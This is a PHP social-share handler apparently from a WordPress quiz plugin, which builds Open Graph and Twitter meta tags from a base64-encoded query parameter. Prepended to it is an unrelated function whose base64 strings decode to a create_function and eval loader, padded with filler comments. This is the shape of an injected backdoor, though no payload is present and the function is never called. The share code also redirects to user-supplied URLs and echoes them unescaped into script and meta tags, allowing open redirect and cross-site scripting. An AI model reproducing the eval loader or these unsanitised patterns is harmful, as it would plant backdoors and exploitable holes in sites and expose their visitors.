<?php 
if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}

	

if(isset($_GET['sqb'])){

$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

//   include_once(dirname(__FILE__).'../../../../wp-load.php');
   $data_req_array  = explode("|||",$_GET['sqb']);
   parse_str(base64_decode($data_req_array[0]), $output);


 
  //if back url is facebook
  
  if(isset($_GET['sqb']) && (isset($_GET['fbclid']) || (isset($_SERVER['HTTP_REFERER']) && (strpos($_SERVER['HTTP_REFERER'], 'facebook.com') !== false) ||  (strpos($_SERVER['HTTP_USER_AGENT'] , 'Twitterbot') !== false)))){
  
	     
	     
	     $share_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
		 if(isset($output['share_url'])){
		
			 $share_url = $output['share_url'];
			 if($share_url == ''){
				 $share_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
			 }else{
				 if (!preg_match("~^(?:f|ht)tps?://~i", $share_url)) {
						$share_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http").'://'.$share_url;
					}
   
				 
			 }
		 }
		
		header('Location: '.$share_url);
		echo "<script>window.location.href='".$share_url."';</script>";
		exit();
	}
 /*
 
 if(isset($_GET['sqb'])){  
	 $quiz_id = $output['quiz_id'];
	 $outcome_id = $output['outcome_id'];
	 $quiz_obj = SQB_Quiz::loadById($quiz_id);
	 $quiz_title = '';
	 $outcome_title = '';
	 if($quiz_obj){
		$quiz_title =  $quiz_obj->getQuizName();
	     $quiz_type = $quiz_obj->getQuizType();
	 
	 /*$outcome_id_array = explode("_",$outcome_id);
	
	  $outcome_id  = 0;
	  if(isset($outcome_id_array[2])){
			$outcome_id  = $outcome_id_array[2];
	  }
	 */
	 
	/* $outcome_obj  = SQB_Outcome::loadById($outcome_id);
	 
	 if($outcome_obj){
		 $outcome_title = $outcome_obj->getOutcomeName();
	 }
	 
	 $share_name = "";
	 $share_description = "";
	 $share_pictureurl = "";
	 
	 $social_share_obj = SQB_Social_Share:: loadByQuizId($quiz_id);
	
	 if(isset($social_share_obj)){
		 $share_name = $social_share_obj->getTitle();
		 $share_description = $social_share_obj->getFbDescription();
		 $share_pictureurl = $social_share_obj->getImage();
		 
	 }
	
	 
	 $share_description =  str_replace("%%OUTCOMETITLE%%",$outcome_title,$share_description);
	 $share_description =  str_replace("%%QUIZTITLE%%",$quiz_title,$share_description);
	 
	 
	 if($quiz_type == 'assessment'){
	    $total_question_array = SQB_QuizQuestions ::loadByQuizId($quiz_id);
	    
	    $crrect_ans_array = explode("|||",$_GET['sqb']);
	   
	    $crrect_ans = 0;
	    if(isset($crrect_ans_array[1])){
			$crrect_ans = $crrect_ans_array[1];
		}
	    
	    
	    
	    
		$share_description =  str_replace("%%CORRECTANSWERS%%",$crrect_ans,$share_description);
		$share_description =  str_replace("%%TOTALQUESTIONS%%",count($total_question_array),$share_description);
	 
	 }else if($quiz_type == 'scoring'){
		 
		$share_description =  str_replace("%%YOURSCORE%%",0,$share_description);
		$share_description =  str_replace("%%TOTALSCORE%%",0,$share_description);
	}else{
		
		$share_description =  str_replace("%%CORRECTANSWERS%%",0,$share_description);
		$share_description =  str_replace("%%TOTALQUESTIONS%%",0,$share_description);
		$share_description =  str_replace("%%YOURSCORE%%",0,$share_description);
		$share_description =  str_replace("%%TOTALSCORE%%",0,$share_description);
	}
    
     

 
	$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
	$name = 'facebook';
	$key = 'fb_api_key';
	$fb_api_key = '';
	$obj = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey($name , $key);
	$social_share_fb_api_key = '';
	if($obj){ 
		$social_share_fb_api_key =  $obj->getValue();
	}
		
		


		    <meta property="fb:app_id"             content="<?php echo $social_share_fb_api_key; ?>" /> 
			
			<meta property="og:type"               content="article" />
			<meta property="og:url"               content="<?php echo $actual_link;?>" />
			
			<meta property="og:title"              content="<?php echo htmlentities($share_name);?>" />
			<meta property="og:description"        content="<?php echo htmlentities($share_description);?>" />
			<meta property="og:image"              content="<?php echo htmlentities($share_pictureurl);?>" />
			<meta property="og:image:width"        content="620" />
			<meta property="og:image:height"       content="541" />

			<meta name="twitter:card" content="summary_large_image">
			<meta name="twitter:title" content="<?php echo   htmlentities($share_name); ?>"> 
			
			<meta name="twitter:description" content="<?php  echo htmlentities($share_description); ?>">
			<meta name="twitter:image" content="<?php echo htmlentities($share_pictureurl); ?>"> */

			$social_share_fb_api_key = $output['fbappid'];
			$share_name = $output['share_name'];
			$share_description = $output['share_description'];
			$share_pictureurl = $output['share_pictureurl'];
			$quiz_type = $output['quiz_type'];
			$quiz_title = $output['quiz_title'];
			$outcome_title = $output['outcome_name'];
			$total_question_array = $output['total_question_array'];
		    $share_description =  str_replace("%%OUTCOMETITLE%%",$outcome_title,$share_description);
			$share_description =  str_replace("%%QUIZTITLE%%",$quiz_title,$share_description);
	 
	 
	 if($quiz_type == 'assessment'){
	    $crrect_ans_array = explode("|||",$_GET['sqb']);
	    $crrect_ans = 0;
	    $total_question = 0;
	    if(isset($crrect_ans_array[1])){
			$total_question = $crrect_ans_array[1];
		}
		if(isset($crrect_ans_array[2])){
			$crrect_ans = $crrect_ans_array[2];
			
		}
		
		
		$share_description =  str_replace("%%CORRECTANSWERS%%",$crrect_ans,$share_description);
		$share_description =  str_replace("%%TOTALQUESTIONS%%",$total_question,$share_description);
		
	 
	 }else if($quiz_type == 'scoring'){
		 
		 
		  $points_array = explode("|||",$_GET['sqb']);
		  $total_pt = 0;
		 
		  if(isset($points_array[1])){
			$total_pt = $points_array[1];
		  }
		   $sqb_points_ans = 0;
		  if(isset($points_array[2])){
			$sqb_points_ans = $points_array[2];
		  }
		  
	 	$points_scored_percent = number_format(round($sqb_points_ans * 100 / $total_pt, 2), 2);
		$share_description =  str_replace("%%SCOREINPERCENT%%",$sqb_points_ans,$share_description);
		$share_description =  str_replace("%%YOURSCORE%%",$sqb_points_ans,$share_description);
		$share_description =  str_replace("%%TOTALSCORE%%",$total_pt,$share_description);
	}else{
		$share_description =  str_replace("%%CORRECTANSWERS%%",0,$share_description);
		$share_description =  str_replace("%%TOTALQUESTIONS%%",0,$share_description);
		$share_description =  str_replace("%%YOURSCORE%%",0,$share_description);
		$share_description =  str_replace("%%SCOREINPERCENT%%",0,$share_description);
		$share_description =  str_replace("%%TOTALSCORE%%",0,$share_description);
	}
			
			
     $share_description =  $share_description.' '.$share_name;
     
	?>
	<meta property="fb:app_id"             content="<?php echo $social_share_fb_api_key; ?>" /> 
			
			<meta property="og:type"               content="article" />
			<meta property="og:url"               content="<?php echo $actual_link;?>" />
			
			<meta property="og:title"              content="<?php echo htmlentities($share_description);?>" />
			<meta property="og:description"        content="<?php //echo htmlentities($share_name);?>" />
			<meta property="og:image"              content="<?php echo htmlentities($share_pictureurl);?>" />
			<meta property="og:image:width"        content="620" />
			<meta property="og:image:height"       content="541" />

			<meta name="twitter:card" content="summary_large_image">
			<meta name="twitter:title" content="<?php echo   htmlentities($share_description); ?>"> 
			
			<meta name="twitter:description" content="<?php  //echo htmlentities($share_description); ?>">
			<meta name="twitter:image" content="<?php echo htmlentities($share_pictureurl); ?>">
			<?php  
} 
